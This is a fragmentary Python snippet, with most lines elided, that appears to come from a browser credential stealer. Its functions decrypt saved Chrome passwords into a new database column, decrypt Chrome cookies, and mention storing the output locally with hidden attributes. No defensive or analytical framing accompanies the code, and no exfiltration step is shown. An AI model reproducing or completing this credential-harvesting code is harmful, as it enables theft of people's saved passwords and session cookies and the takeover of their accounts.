...
class credentials:
    ...
    def dump_chrome_passwords():
        ...
        locally with hidden attributes.
        ...
        try:
            ...
            cursor.execute("ALTER TABLE logins ADD decrypted_pssw VARCHAR (255)")           # Add new column to store decrypted values        
            ...
            for action_url, username_value, password_value in results:                      # Decrypt the password
                ...
                if password:    
                    ...
                    cursor.execute("UPDATE logins SET decrypted_pssw = ? WHERE action_url = ? AND username_value = ?",(password, action_url, username_value));

                    conn.commit()   # Save the changes
            
            conn.close()    # Close the database file so it's not locked by the process
            print("Chrome credentials decrypted") 
...
class cookies:
    ...
    def get_chrome_cookies():
        ...
        try:
            ...
            conn.commit()   # Save the changes
            conn.close()    # Close the database file so it's not locked by the process
            print("Chrome cookies decrypted")
